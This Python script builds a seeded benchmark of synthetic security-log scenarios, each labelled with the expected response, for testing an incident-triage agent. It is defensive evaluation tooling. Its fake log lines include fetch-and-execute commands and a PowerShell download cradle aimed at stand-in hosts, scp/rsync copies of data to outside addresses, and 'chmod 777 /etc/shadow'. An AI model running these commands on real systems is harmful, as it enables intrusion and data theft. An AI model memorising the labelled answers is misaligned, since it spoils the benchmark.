"""
scripts/gen_benchmark.py — builds data/benchmark/scenarios.jsonl (seeded, reproducible).

~150 labelled scenarios:
  attack    all 7 attack vectors, 2-3 templates each, varied formats
            (syslog, key=value, JSON lines), users, hosts and IPs
  benign    ordinary operational noise the cheap filter should drop
  fp_trap   benign activity that LOOKS malicious (service account retrying
            after a password rotation, authorised vulnerability scan, admin
            sudo maintenance, nightly rsync backup, VPN CONNECT tunnel,
            EICAR AV self-test, base64-decoding a PEM, ...). The right
            operational outcome is NO containment.

Labels follow the playbooks in config/playbooks/: `acceptable_actions` and
`acceptable_targets` list every response the matching playbook permits
(e.g. malware may be TERMINATE_PROCESS on the PID/name or ISOLATE_HOST on
the endpoint). `expected_action_type` / `expected_target` are the
playbook's first-choice step.

External IPs use RFC 5737 documentation ranges; some are deliberately in
data/threat_intel/blocklist.csv so the forensics agent's intel tool has
something to find. No real hosts or people are referenced.

Usage: python scripts/gen_benchmark.py [--seed 7] [--out data/benchmark/scenarios.jsonl]
"""

from __future__ import annotations

import argparse
import json
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent

USERS = ["alice", "bob", "carol", "dave", "erin", "frank", "grace", "heidi", "ivan", "judy",
         "mallory", "oscar", "peggy", "trent", "victor", "walter"]
SERVICE_ACCOUNTS = ["svc-reporting", "svc-backup", "svc-ci", "svc-monitor", "svc-payroll"]
HOSTS = ["WS-FIN-07", "WS-HR-12", "WS-ENG-03", "WS-OPS-21", "LAPTOP-DEV-44", "SRV-APP-02",
         "SRV-DB-01", "WS-SALES-09", "WS-LEGAL-05", "KIOSK-LOBBY-1"]
EXT_BAD = ["198.51.100.23", "198.51.100.77", "203.0.113.45", "203.0.113.200", "192.0.2.66", "192.0.2.140"]
EXT_NEUTRAL = ["198.51.100.130", "198.51.100.201", "192.0.2.12", "192.0.2.99", "203.0.113.9"]
MALWARE_PROCS = ["svch0st.exe", "updater_x.exe", "invoice_viewer.exe", "mimikatz.exe", "xmrig", "nc.exe"]


def internal_ip(rng: random.Random) -> str:
    return f"10.{rng.randint(0, 40)}.{rng.randint(0, 254)}.{rng.randint(2, 254)}"


class Clock:
    def __init__(self, rng: random.Random):
        self.rng = rng
        self.t = datetime(2026, 6, rng.randint(1, 28), rng.randint(0, 23), rng.randint(0, 59), tzinfo=timezone.utc)

    def tick(self, lo: int = 1, hi: int = 12) -> datetime:
        self.t += timedelta(seconds=self.rng.randint(lo, hi))
        return self.t


def iso(t: datetime) -> str:
    return t.strftime("%Y-%m-%dT%H:%M:%SZ")


def syslog(t: datetime) -> str:
    return t.strftime("%b %d %H:%M:%S")


def scenario(sid, category, logs, vector, action, target, acceptable_actions, acceptable_targets,
             mitre, playbook, notes=""):
    return {
        "id": sid, "category": category, "logs": logs,
        "expected_attack_vector": vector, "expected_action_type": action, "expected_target": target,
        "acceptable_actions": acceptable_actions, "acceptable_targets": acceptable_targets,
        "mitre": mitre, "expected_playbook": playbook, "notes": notes,
    }


# --------------------------------------------------------------------------- attacks

def brute_force(rng, i):
    user, c = rng.choice(USERS + ["administrator", "root"]), Clock(rng)
    if i % 3 == 2:  # internal host spraying many accounts -> isolate the source
        src = internal_ip(rng)
        logs = [f"{syslog(c.tick())} auth-gw sshd[{rng.randint(900, 9999)}]: failed login for user "
                f"{u} from {src} port {rng.randint(40000, 60000)}" for u in rng.sample(USERS, 8)]
        return scenario(f"bf-{i:03d}", "attack", logs, "BRUTE_FORCE_AUTH", "ISOLATE_HOST", src,
                        ["ISOLATE_HOST"], [src], ["T1110", "T1110.003"], "brute_force_auth.md",
                        "password spraying from an internal host")
    src = rng.choice(EXT_BAD + EXT_NEUTRAL)
    n = rng.randint(5, 14)
    if i % 3 == 0:
        logs = [f"{iso(c.tick())} AUTH failed login for user {user} from {src} - invalid password" for _ in range(n)]
        logs.append(f"{iso(c.tick())} AUTH successful login for user {user} from {src}")
    else:
        logs = [json.dumps({"timestamp": iso(c.tick()), "src_ip": src, "user": user,
                            "message": "authentication failure: invalid password"}) for _ in range(n)]
        logs.append(json.dumps({"timestamp": iso(c.tick()), "src_ip": src, "user": user,
                                "message": "authentication succeeded"}))
    return scenario(f"bf-{i:03d}", "attack", logs, "BRUTE_FORCE_AUTH", "LOCK_ACCOUNT", user,
                    ["LOCK_ACCOUNT"], [user], ["T1110", "T1110.001", "T1078"], "brute_force_auth.md",
                    f"{n} failures then success")


def network_intrusion(rng, i):
    c = Clock(rng)
    if i % 2 == 0:  # external scanner -> isolate the targeted internal host
        src, dst = rng.choice(EXT_BAD + EXT_NEUTRAL), internal_ip(rng)
        ports = rng.sample([21, 22, 23, 25, 80, 135, 139, 443, 445, 3389, 5900, 8080], 6)
        logs = [f"{iso(c.tick())} fw-edge DROP src={src} dst={dst} dport={p} proto=TCP flags=SYN "
                f"note=port scan" for p in ports]
        logs.append(f"{iso(c.tick())} ids alert: nmap SYN scan signature from {src} against {dst}")
        return scenario(f"ni-{i:03d}", "attack", logs, "NETWORK_INTRUSION", "ISOLATE_HOST", dst,
                        ["ISOLATE_HOST"], [dst, src], ["T1046", "T1595"], "network_intrusion.md",
                        "external port scan")
    src = internal_ip(rng)  # internal scanner / lateral movement -> isolate the source
    targets = [internal_ip(rng) for _ in range(5)]
    logs = [f"{syslog(c.tick())} ids[{rng.randint(100, 999)}]: masscan sweep from {src} to {t} ports 1-1024"
            for t in targets]
    logs.append(f"{syslog(c.tick())} ids: unauthorized access attempt from {src} to {targets[0]} port 445")
    return scenario(f"ni-{i:03d}", "attack", logs, "NETWORK_INTRUSION", "ISOLATE_HOST", src,
                    ["ISOLATE_HOST"], [src], ["T1046", "T1021"], "network_intrusion.md", "internal scanner")


def malware(rng, i):
    c, host, pid = Clock(rng), rng.choice(HOSTS), str(rng.randint(1000, 30000))
    proc = rng.choice(MALWARE_PROCS)
    variant = i % 3
    if variant == 0:
        logs = [f"{iso(c.tick())} EDR host={host} ALERT Malware execution confirmed. Rogue process PID:{pid} "
                f"spawning encoded reverse shell via powershell -enc on workstation {host}",
                f"{iso(c.tick())} EDR host={host} outbound connection from PID:{pid} to {rng.choice(EXT_BAD)}:4444"]
        mitre = ["T1059", "T1059.001", "T1071"]
        targets = [pid, host, "powershell"]
    elif variant == 1:
        url = f"http://cdn-update.example/{rng.randint(100, 999)}.bin"
        logs = [f"{syslog(c.tick())} {host} bash[{pid}]: wget {url} -O /tmp/.x && chmod +x /tmp/.x",
                f"{syslog(c.tick())} {host} bash[{pid}]: echo cGF5bG9hZA== | base64 -d | sh",
                f"{syslog(c.tick())} {host} kernel: process {proc} PID:{pid} flagged as trojan by AV"]
        mitre = ["T1105", "T1027", "T1059.004"]
        targets = [pid, proc, host]
    else:
        logs = [json.dumps({"time": iso(c.tick()), "host": host, "process": proc, "pid": int(pid),
                            "event": f"ransomware behaviour: mass file encryption by {proc} PID:{pid}"}),
                json.dumps({"time": iso(c.tick()), "host": host, "process": proc, "pid": int(pid),
                            "event": "malware dropped ransom note README_DECRYPT.txt"})]
        mitre = ["T1486", "T1204"]
        targets = [pid, proc, host]
    return scenario(f"mx-{i:03d}", "attack", logs, "MALWARE_EXECUTION", "TERMINATE_PROCESS", pid,
                    ["TERMINATE_PROCESS", "ISOLATE_HOST", "QUARANTINE_PROCESS"], targets,
                    mitre, "malware_execution.md", f"variant {variant}")


def exfiltration(rng, i):
    c, user, host = Clock(rng), rng.choice(USERS), internal_ip(rng)
    dest = rng.choice(EXT_BAD + EXT_NEUTRAL)
    variant = i % 3
    if variant == 0:
        logs = [f"{syslog(c.tick())} {host} sshd: user {user} ran scp -r /srv/finance {user}@{dest}:/drop/",
                f"{syslog(c.tick())} dlp: bulk transfer of 4.2GB by user {user} from {host} to {dest}"]
        mitre = ["T1048"]
    elif variant == 1:
        logs = [f"{iso(c.tick())} proxy user={user} src={host} dst={dest} method=PUT bytes=2147483648 "
                f"url=https://paste-drop.example/up note=bulk upload exfiltration suspected",
                f"{iso(c.tick())} proxy user={user} src={host} dst={dest} method=PUT bytes=1073741824 "
                f"url=https://paste-drop.example/up"]
        mitre = ["T1567", "T1041"]
    else:
        logs = [f"{syslog(c.tick())} {host} rsync[{rng.randint(1000, 9999)}]: user {user} rsync -az /home/shared "
                f"{user}@{dest}:/exfil/",
                f"{syslog(c.tick())} {host} dlp: bulk export of customer table by user {user}"]
        mitre = ["T1048"]
    return scenario(f"dx-{i:03d}", "attack", logs, "DATA_EXFILTRATION", "LOCK_ACCOUNT", user,
                    ["LOCK_ACCOUNT", "BLOCK_PROXY_IP", "ISOLATE_HOST"], [user, dest, host], mitre,
                    "data_exfiltration.md", f"variant {variant}")


def privilege_escalation(rng, i):
    c, user, host = Clock(rng), rng.choice(USERS), rng.choice(HOSTS)
    variant = i % 3
    if variant == 0:
        logs = [f"{syslog(c.tick())} {host} sudo: {user} : user NOT in sudoers ; COMMAND=/bin/sh",
                f"{syslog(c.tick())} {host} sudo: {user} : TTY=pts/2 ; USER=root ; COMMAND=/bin/sh -i",
                f"{syslog(c.tick())} {host} audit: user {user} obtained uid=0 via sudo"]
        mitre = ["T1548", "T1548.003"]
    elif variant == 1:
        logs = [f"{syslog(c.tick())} {host} bash: user {user} chmod 777 /etc/shadow",
                f"{syslog(c.tick())} {host} bash: user {user} chmod +x /usr/local/bin/.hidden_root",
                f"{syslog(c.tick())} {host} audit: setuid binary created by user {user}"]
        mitre = ["T1222", "T1548"]
    else:
        logs = [f"{iso(c.tick())} {host} kernel exploit attempt CVE-2026-0001 by user {user} PID:{rng.randint(1000, 9999)}",
                f"{iso(c.tick())} {host} audit: user {user} privilege escalation to SYSTEM via sudo misconfiguration"]
        mitre = ["T1068"]
    return scenario(f"pe-{i:03d}", "attack", logs, "PRIVILEGE_ESCALATION", "LOCK_ACCOUNT", user,
                    ["LOCK_ACCOUNT", "QUARANTINE_PROCESS"], [user], mitre, "privilege_escalation.md",
                    f"variant {variant}")


def proxy_anomaly(rng, i):
    c, src, user = Clock(rng), internal_ip(rng), rng.choice(USERS)
    variant = i % 2
    if variant == 0:
        logs = [f"{iso(c.tick())} squid src={src} user={user} CONNECT {rng.choice(EXT_BAD)}:{p} tunnel established"
                for p in (8443, 9001, 4444)]
        logs.append(f"{iso(c.tick())} squid src={src} user={user} tunneling via socks proxy to evil-c2.example")
        mitre = ["T1090", "T1572"]
    else:
        logs = [f"{iso(c.tick())} waf src={src} X-Forwarded-For spoofed header chain 127.0.0.1,{rng.choice(EXT_NEUTRAL)}",
                f"{iso(c.tick())} proxy src={src} user={user} proxy bypass attempt to {rng.choice(EXT_BAD)}"]
        mitre = ["T1090"]
    return scenario(f"px-{i:03d}", "attack", logs, "PROXY_ANOMALY", "BLOCK_PROXY_IP", src,
                    ["BLOCK_PROXY_IP", "LOCK_ACCOUNT"], [src, user], mitre, "proxy_anomaly.md", f"variant {variant}")


def unknown(rng, i):
    c, host = Clock(rng), rng.choice(HOSTS)
    pool = [
        f"{syslog(c.tick())} {host} app[{rng.randint(100, 999)}]: unauthorized access flag raised by module X7 (no details)",
        f"{syslog(c.tick())} {host} kernel: unknown device behaviour; trojan? heuristic score 0.41",
        f"{syslog(c.tick())} {host} svc: multiple failed attempts reported by legacy agent (source unavailable)",
        f"{syslog(c.tick())} {host} edr: suspicious but unclassified sequence; malware family unknown",
    ]
    return scenario(f"uk-{i:03d}", "unknown", rng.sample(pool, 2), "UNKNOWN", "NO_ACTION", None,
                    ["NO_ACTION"], ["none"], [], "unknown_threat.md", "ambiguous, no actionable target")


# --------------------------------------------------------------------------- hard split

def hard_paraphrase(rng, i):
    """
    Vendor-style telemetry (Windows Security events, netflow, EDR process
    creation) that avoids the obvious keywords a naive classifier keys on.
    The cheap filter still passes these via its SIEM-indicator rules; the
    attack vector and target have to come from actually reading the event.
    """
    c, user, host = Clock(rng), rng.choice(USERS), rng.choice(HOSTS)
    kind = i % 6
    if kind == 0:
        src, n = rng.choice(EXT_BAD + EXT_NEUTRAL), rng.randint(6, 12)
        logs = [f"{iso(c.tick())} EventID=4625 An account failed to log on. TargetUserName={user} "
                f"IpAddress={src} LogonType=3 Status=0xC000006A" for _ in range(n)]
        logs.append(f"{iso(c.tick())} EventID=4624 An account was successfully logged on. TargetUserName={user} "
                    f"IpAddress={src} LogonType=3")
        return scenario(f"hd-{i:03d}", "attack", logs, "BRUTE_FORCE_AUTH", "LOCK_ACCOUNT", user,
                        ["LOCK_ACCOUNT"], [user], ["T1110", "T1078"], "brute_force_auth.md",
                        "hard: Windows 4625 burst then 4624")
    if kind == 1:
        src, dst = rng.choice(EXT_BAD + EXT_NEUTRAL), internal_ip(rng)
        logs = [f"{iso(c.tick())} fw-edge summary: {rng.randint(900, 1500):,} inbound connection attempts to "
                f"sequential ports on {dst} from {src} within 30s (SYN only, no handshake completed)",
                f"{iso(c.tick())} fw-edge summary: {dst} responded on 22/tcp, 445/tcp to {src}"]
        return scenario(f"hd-{i:03d}", "attack", logs, "NETWORK_INTRUSION", "ISOLATE_HOST", dst,
                        ["ISOLATE_HOST"], [dst, src], ["T1046"], "network_intrusion.md", "hard: port sweep summary")
    if kind == 2:
        proc, pid = rng.choice(["invoice_viewer.exe", "updater_x.exe", "svch0st.exe"]), str(rng.randint(1000, 30000))
        logs = [f"{iso(c.tick())} EventID=4688 host={host} NewProcessName={proc} NewProcessId={pid} "
                f"ParentProcessName=winword.exe CommandLine={proc} -nop -w hidden -c IEX(New-Object Net.WebClient)"
                f".DownloadString(cdn-update.example)",
                f"{iso(c.tick())} sysmon EventID=3 host={host} Image={proc} DestinationIp={rng.choice(EXT_BAD)} "
                f"DestinationPort=443"]
        return scenario(f"hd-{i:03d}", "attack", logs, "MALWARE_EXECUTION", "TERMINATE_PROCESS", pid,
                        ["TERMINATE_PROCESS", "ISOLATE_HOST", "QUARANTINE_PROCESS"], [pid, proc, host],
                        ["T1059", "T1059.001", "T1105", "T1204"], "malware_execution.md",
                        "hard: Office macro spawning a download cradle")
    if kind == 3:
        src, dest = internal_ip(rng), rng.choice(EXT_BAD + EXT_NEUTRAL)
        size = rng.randint(20, 90)
        logs = [f"{iso(c.tick())} netflow src={src} dst={dest} dport=443 bytes_out={size}GB bytes_in=3MB "
                f"duration=7140s user={user}",
                f"{iso(c.tick())} netflow src={src} dst={dest} note=largest egress for {user} in 90 days"]
        return scenario(f"hd-{i:03d}", "attack", logs, "DATA_EXFILTRATION", "LOCK_ACCOUNT", user,
                        ["LOCK_ACCOUNT", "BLOCK_PROXY_IP", "ISOLATE_HOST"], [user, dest, src], ["T1048", "T1041"],
                        "data_exfiltration.md", "hard: netflow egress volume")
    if kind == 4:
        logs = [f"{iso(c.tick())} EventID=4672 Special privileges assigned to new logon. SubjectUserName={user} "
                f"host={host} Privileges=SeDebugPrivilege SeTcbPrivilege SeImpersonatePrivilege",
                f"{iso(c.tick())} EventID=4732 host={host} {user} added to security-enabled local group Administrators "
                f"by {user} (self-assignment)"]
        return scenario(f"hd-{i:03d}", "attack", logs, "PRIVILEGE_ESCALATION", "LOCK_ACCOUNT", user,
                        ["LOCK_ACCOUNT", "QUARANTINE_PROCESS"], [user], ["T1068", "T1078"], "privilege_escalation.md",
                        "hard: self-assigned admin group membership")
    src = internal_ip(rng)
    logs = [f"{iso(c.tick())} proxy src={src} user={user} dst={rng.choice(EXT_BAD)}:443 sni=cdn-update.example "
            f"bytes=312 interval=60s jitter=0% (beacon pattern, {rng.randint(40, 300)} sessions)"]
    return scenario(f"hd-{i:03d}", "attack", logs, "PROXY_ANOMALY", "BLOCK_PROXY_IP", src,
                    ["BLOCK_PROXY_IP", "LOCK_ACCOUNT"], [src, user], ["T1071", "T1090"], "proxy_anomaly.md",
                    "hard: fixed-interval C2 beacon through the proxy")


# --------------------------------------------------------------------------- benign + FP traps

def benign(rng, i):
    c, user, host = Clock(rng), rng.choice(USERS), internal_ip(rng)
    pool = [
        f"{syslog(c.tick())} sshd[{rng.randint(900, 9999)}]: Accepted publickey for {user} from {host} port 51022",
        f"{iso(c.tick())} nginx {host} GET /index.html 200 5120",
        f"{syslog(c.tick())} CRON[{rng.randint(100, 999)}]: (root) CMD (/usr/local/bin/rotate-logs)",
        f"{iso(c.tick())} app user={user} action=report_generated duration_ms=412",
        f"{syslog(c.tick())} systemd[1]: Started Daily apt download activities.",
        f"{iso(c.tick())} dhcp lease renewed for {host}",
        f"{iso(c.tick())} backup job nightly-db completed OK size=12GB",
    ]
    return scenario(f"bn-{i:03d}", "benign", rng.sample(pool, 5), "NONE", "NONE", None, ["NONE"], [], [], "",
                    "ordinary noise; expected to be filtered before any LLM call")


def fp_trap(rng, i):
    c = Clock(rng)
    kind = i % 9
    if kind == 0:
        acct, host = rng.choice(SERVICE_ACCOUNTS), internal_ip(rng)
        logs = [f"{iso(c.t)} directory: password changed for user {acct} by change ticket CHG{rng.randint(1000, 9999)}"]
        for _ in range(6):
            c.t += timedelta(seconds=30)  # mechanically regular retry interval
            logs.append(f"{iso(c.t)} AUTH failed login for user {acct} from {host} - stale cached credential")
        return scenario(f"fp-{i:03d}", "fp_trap", logs, "BRUTE_FORCE_AUTH", "NO_ACTION", None,
                        ["NO_ACTION"], ["none"], ["T1110"], "brute_force_auth.md",
                        "service account retrying every 30s after password rotation")
    if kind == 1:
        scanner = internal_ip(rng)
        logs = [f"{iso(c.tick())} ids: nmap scan from {scanner} (nessus-01, authorized scanner, maintenance window MW-7)"
                for _ in range(4)]
        return scenario(f"fp-{i:03d}", "fp_trap", logs, "NETWORK_INTRUSION", "NO_ACTION", None,
                        ["NO_ACTION"], ["none"], ["T1046"], "network_intrusion.md", "authorised vulnerability scan")
    if kind == 2:
        admin, host = rng.choice(["alice", "trent"]), rng.choice(HOSTS)
        logs = [f"{syslog(c.tick())} {host} sudo: {admin} : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/apt-get upgrade -y",
                f"{syslog(c.tick())} {host} sudo: {admin} : TTY=pts/0 ; USER=root ; COMMAND=/bin/systemctl restart nginx"]
        return scenario(f"fp-{i:03d}", "fp_trap", logs, "PRIVILEGE_ESCALATION", "NO_ACTION", None,
                        ["NO_ACTION"], ["none"], ["T1548.003"], "privilege_escalation.md", "admin maintenance via sudo")
    if kind == 3:
        logs = [f"{syslog(c.tick())} backup01 rsync[{rng.randint(1000, 9999)}]: svc-backup rsync -az /srv/db "
                f"svc-backup@backup01.corp.local:/vault/nightly (scheduled backup window)"]
        return scenario(f"fp-{i:03d}", "fp_trap", logs, "DATA_EXFILTRATION", "NO_ACTION", None,
                        ["NO_ACTION"], ["none"], ["T1048"], "data_exfiltration.md", "nightly backup to approved target")
    if kind == 4:
        user = rng.choice(USERS)
        logs = [f"{syslog(c.tick())} {rng.choice(HOSTS)} bash: user {user} chmod +x /home/{user}/projects/build.sh"]
        return scenario(f"fp-{i:03d}", "fp_trap", logs, "PRIVILEGE_ESCALATION", "NO_ACTION", None,
                        ["NO_ACTION"], ["none"], ["T1222"], "privilege_escalation.md", "developer chmod in own workspace")
    if kind == 5:
        src = internal_ip(rng)
        logs = [f"{iso(c.tick())} squid src={src} CONNECT 198.51.100.130:443 tunnel to vpn-gw.corp.local "
                f"(GlobalProtect corporate VPN)"]
        return scenario(f"fp-{i:03d}", "fp_trap", logs, "PROXY_ANOMALY", "NO_ACTION", None,
                        ["NO_ACTION"], ["none"], ["T1090"], "proxy_anomaly.md", "corporate VPN tunnel")
    if kind == 6:
        host = rng.choice(HOSTS)
        logs = [f"{iso(c.tick())} av host={host} malware test file EICAR detected during scheduled self-test "
                f"(simulated) sha256 275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"]
        return scenario(f"fp-{i:03d}", "fp_trap", logs, "MALWARE_EXECUTION", "NO_ACTION", None,
                        ["NO_ACTION"], ["none"], [], "malware_execution.md", "AV self-test with EICAR")
    if kind == 7:
        user = rng.choice(USERS)
        logs = [f"{syslog(c.tick())} {rng.choice(HOSTS)} bash: user {user} base64 -d server-cert.pem.b64 > server-cert.pem"]
        return scenario(f"fp-{i:03d}", "fp_trap", logs, "MALWARE_EXECUTION", "NO_ACTION", None,
                        ["NO_ACTION"], ["none"], ["T1027"], "malware_execution.md", "decoding a PEM certificate")
    user = rng.choice(USERS)
    logs = [f"{iso(c.tick())} app ERROR unauthorized access: session token expired for user {user} on /reports"]
    return scenario(f"fp-{i:03d}", "fp_trap", logs, "UNKNOWN", "NO_ACTION", None,
                    ["NO_ACTION"], ["none"], [], "unknown_threat.md", "business-logic 'unauthorized' message")


PLAN = [
    (brute_force, 14), (network_intrusion, 14), (malware, 14), (exfiltration, 14),
    (privilege_escalation, 14), (proxy_anomaly, 12), (hard_paraphrase, 24),
    (unknown, 10), (benign, 16), (fp_trap, 18),
]


def build(seed: int) -> list[dict]:
    rng = random.Random(seed)
    out = []
    for fn, count in PLAN:
        for i in range(count):
            row = fn(rng, i)
            row["difficulty"] = "hard" if fn is hard_paraphrase else "standard"
            out.append(row)
    return out


def main() -> None:
    p = argparse.ArgumentParser()
    p.add_argument("--seed", type=int, default=7)
    p.add_argument("--out", type=Path, default=ROOT / "data" / "benchmark" / "scenarios.jsonl")
    args = p.parse_args()
    rows = build(args.seed)
    args.out.parent.mkdir(parents=True, exist_ok=True)
    args.out.write_text("\n".join(json.dumps(r) for r in rows) + "\n", encoding="utf-8")
    by_cat: dict[str, int] = {}
    for r in rows:
        key = r["expected_attack_vector"] if r["category"] == "attack" else r["category"]
        by_cat[key] = by_cat.get(key, 0) + 1
    print(f"Wrote {len(rows)} scenarios to {args.out}: {by_cat}")


if __name__ == "__main__":
    main()
